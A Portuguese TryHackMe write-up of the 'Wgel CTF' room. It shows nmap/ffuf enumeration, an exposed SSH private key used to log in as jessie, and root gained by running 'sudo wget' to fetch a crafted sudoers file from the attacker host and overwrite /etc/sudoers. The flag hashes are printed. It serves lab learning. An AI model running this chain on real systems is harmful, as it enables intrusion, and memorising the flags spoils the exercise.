---
tags: [thm, room, writeup, pentest, reconhecimento, enumeracao, web, acesso_inicial, pos_exploracao, privesc, misc]
criado: 2026-09-10
dificuldade: easy
---

# Wgel CTF — TryHackMe

A sessão começou com o setup padrão da sala **Wgel CTF** no TryHackMe: a Lab machine ligada, a AttackBox desligada e as duas flags (user e root) esperando um hash MD5 de 32 caracteres.

![Setup da sala Wgel CTF](assets/00-00-17_crop.webp)

Assim que o alvo foi liberado (`10.64.179.243`), mapeei o IP para um hostname local editando o `/etc/hosts` com `sudo nano /etc/hosts`, adicionando a entrada `10.64.179.243 thmtarget` para facilitar o resto da enumeração.

![Editando /etc/hosts](assets/00-02-45_crop.webp)

Com o alvo endereçável, rodei o `nmap` — primeiro um scan simples de portas, depois com detecção de versão:

```bash
nmap thmtarget
nmap thmtarget -sV
```

O resultado desenhou uma superfície de ataque enxuta: `22/tcp` com **OpenSSH 7.2p2 Ubuntu 4ubuntu2.8** e `80/tcp` com **Apache httpd 2.4.18 ((Ubuntu))**, além de uma `6101/tcp` reportada como `filtered`. O sistema é um Ubuntu Xenial (16.04).

![Nmap scan do alvo](assets/00-03-41_crop.webp)

A porta 80 servia apenas a página **"Apache2 Ubuntu Default Page / It works!"**, ou seja, nenhum site real na raiz — era preciso enumerar diretórios.

![Apache2 Ubuntu Default Page](assets/00-03-53_crop.webp)

Parti para o fuzzing com `ffuf` usando a wordlist `dirb-common.txt`:

```bash
ffuf -u http://thmtarget/FUZZ -w ./wordlists/dirb-common.txt
```

Em 15 segundos apareceram `index.html` (200), os habituais `.hta*` e `server-status` com 403, e — o achado relevante — `sitemap` com redirect 301.

![Fuzzing de diretórios com ffuf](assets/00-05-59_crop.webp)

Acessando `http://thmtarget/sitemap/` encontrei um site institucional montado sobre o template **UNAPP**, com hero "Take on your biggest projects and goals" e um mockup de dashboard CRM.

![Site alvo com template UNAPP](assets/00-05-54.webp)

Segui explorando o stack da aplicação. O **Wappalyzer** em `/sitemap/blog.html` identificou Apache 2.4.18 sobre Ubuntu, Vue.js no front-end e as bibliotecas jQuery 2.1.4, Modernizr 2.6.2, OWL Carousel e Bootstrap 3.3.5.

![Fingerprint com Wappalyzer](assets/00-06-54_crop.webp)

O `whatweb` confirmou o mesmo panorama a partir da linha de comando, incluindo o e-mail de contato `info@yoursite.com` e o title "unapp Template":

```bash
whatweb http://thmtarget/sitemap
```

![whatweb no vhost sitemap](assets/00-07-59_crop.webp)

Testei o `searchsploit` para o Modernizr 2.6.2, sem nenhum resultado, enquanto o Wappalyzer reafirmava a lista de tecnologias.

```bash
searchsploit modernizr 2.6.2
```

![searchsploit modernizr](assets/00-08-13_crop.webp)

O passo decisivo foi fuzzear **dentro** de `/sitemap/`:

```bash
ffuf -u http://thmtarget/sitemap/FUZZ -w ./wordlists/dirb-common.txt
```

Além dos diretórios triviais de um site estático (`css`, `fonts`, `images`, `js`) e do `index.html` (200, 21080 bytes), o scan retornou **`.ssh` com status 301** — um diretório `.ssh` acessível via web.

![Fuzzing revela .ssh em /sitemap/](assets/00-08-40_crop.webp)

Repeti o fuzzing com extensões `.html` e `.php` para mapear todas as páginas (`about`, `blog`, `contact`, `services`, `shop`, `work`), mas o `.ssh` continuava sendo o ponto de interesse.

```bash
ffuf -u http://thmtarget/sitemap/FUZZ -w ./wordlists/dirb-common.txt -e .html,.php
```

![Fuzzing com extensões](assets/00-09-36_crop.webp)

Antes de puxar a linha do `.ssh`, houve um desvio de reconhecimento sobre o Apache. Revendo a saída do `nmap` (com os host-keys SSH), tentei conexões `nc` nas portas `7106` e `6101` e busquei exploits para o Apache:

```bash
nc thmtarget 7106
nc thmtarget 6101
searchsploit apache 2.4.18
cp /usr/share/exploitdb/exploits/linux/webapps/42745.py exploittoday.py
```

![Nmap e searchsploit Apache 2.4.18](assets/00-13-34.webp)

Ainda nesse desvio, usei o `exploittoday.py` — um checker para o **Optionsbleed (CVE-2017-9798)**:

```bash
python exploittoday.py -u http://thmtarget
python exploittoday.py -u http://thmtarget -a -n 100
```

Todas as execuções retornaram apenas `[ok]` com o `Allow: POST,OPTIONS,GET,HEAD` normal — o servidor **não** estava vulnerável ao Optionsbleed.

![Teste Optionsbleed](assets/00-18-41.webp)

Também testei manipulação de parâmetros GET no formulário de contato (`/sitemap/contact.html?message=...`) em busca de reflexão/XSS, sem retorno útil.

![Teste no formulário de contato](assets/00-25-47.webp)

Consultei o assistente Echo da sala, que sugeriu revisar os endpoints de `/sitemap` com `curl` e olhar caminhos de flag como `/home/www-data/user.txt`.

![Dica do assistente Echo](assets/00-28-04.webp)

```bash
curl -s http://thmtarget/sitemap
```

O `curl` só confirmou o 301 para `/sitemap/` e o `Server: Apache/2.4.18 (Ubuntu)`.

![curl em /sitemap](assets/00-28-54_crop.webp)

Voltando ao básico, abri o `view-source:http://thmtarget` da página default do Apache e, rolando até o fim do bloco `<pre>`, achei um comentário HTML esquecido:

```html
<!-- Jessie don't forget to udate the webiste -->
```

Ou seja, um provável usuário de sistema/SSH: **jessie**.

![Comentário HTML revela Jessie](assets/00-34-49_crop.webp)

De volta ao `.ssh`, confirmei sua existência mais uma vez via `ffuf` e abri o diretório no navegador.

![Fuzzing confirma /sitemap/.ssh](assets/00-36-27_crop.webp)

O Apache tinha **directory listing habilitado** em `http://thmtarget/sitemap/.ssh/`, expondo um arquivo `id_rsa` (1.6K, de 2019-10-26).

![Directory listing de /sitemap/.ssh/](assets/00-36-47_crop.webp)

Acessando `http://thmtarget/sitemap/.ssh/id_rsa` o servidor devolveu a **chave privada RSA completa**, de `-----BEGIN RSA PRIVATE KEY-----` a `-----END RSA PRIVATE KEY-----`.

![Chave privada SSH exposta](assets/00-36-55_crop.webp)

Salvei a chave e verifiquei se tinha passphrase com `ssh2john` + John:

```bash
ssh2john id_rsa > hashrsa.txt
# id_rsa has no password!
```

A chave não tinha passphrase — pronta para uso direto.

![Chave testada com ssh2john](assets/00-39-46_crop.webp)

Ajustei as permissões e autentiquei. A tentativa com `Jessie` (maiúsculo) caiu em prompt de senha / permission denied; com `jessie` minúsculo o login funcionou:

```bash
chmod 600 id_rsa
ssh -i id_rsa Jessie@thmtarget   # falha
ssh -i id_rsa jessie@thmtarget   # sucesso
```

![SSH com id_rsa como jessie](assets/00-41-15_crop.webp)

O shell caiu num Ubuntu 16.04.6 LTS, hostname **CorpOne**, como `jessie@CorpOne`.

![Shell obtido como jessie](assets/00-41-30_crop.webp)

![Banner de boas-vindas do alvo](assets/00-41-48_crop.webp)

Navegando pelo home (`Desktop`, `Downloads`, `Documents`), a user flag estava em `~/Documents/user_flag.txt`:

```bash
cat ~/Documents/user_flag.txt
# 057c67131c3d5e42dd5cd3075b198ff6
```

![User flag obtida](assets/00-43-04_crop.webp)

Para escalar, `sudo -l` revelou o vetor clássico:

```
(root) NOPASSWD: /usr/bin/wget
```

Jessie podia executar `/usr/bin/wget` como root sem senha. Seguindo o GTFOBins, a ideia foi sobrescrever o `/etc/sudoers`. Na máquina de ataque criei o payload e subi um servidor HTTP:

```bash
echo "jessie ALL=(ALL) NOPASSWD: ALL" > sudoers_hack
python -m http.server 1234
```

![sudo -l revela wget NOPASSWD](assets/00-46-15.webp)

![Preparando o payload de sudoers](assets/00-46-34.webp)

![Servindo o payload via http.server](assets/00-46-59_crop.webp)

No alvo, baixei o arquivo diretamente por cima do `/etc/sudoers` usando o wget privilegiado:

```bash
sudo wget http://192.168.130.73:1234/sudoers_hack -O /etc/sudoers
```

O arquivo foi salvo (31 bytes) e o novo `sudo -l` já mostrava `(ALL) NOPASSWD: ALL`.

![sudo wget sobrescreve /etc/sudoers](assets/00-47-55_crop.webp)

![Privesc confirmada com novo sudo -l](assets/00-48-05_crop.webp)

Depois de uma pausa na sessão, retomei já com privilégios totais e li a root flag:

```bash
sudo cat /root/root_flag.txt
# b1b968b37519ad1daa6408188649263d
```

![Root flag capturada](assets/01-08-59_crop.webp)

Com as duas flags submetidas — user `057c67131c3d5e42dd5cd3075b198ff6` e root `b1b968b37519ad1daa6408188649263d` — a sala foi concluída a 100%.

![Wgel CTF concluída](assets/01-09-14_crop.webp)

Em resumo: a caixa cai por uma combinação de directory listing habilitado expondo `/sitemap/.ssh/id_rsa` (chave privada sem passphrase), um nome de usuário vazado num comentário HTML da página default do Apache (`jessie`), e um `sudo NOPASSWD` em `/usr/bin/wget` que permite reescrever `/etc/sudoers` e virar root.
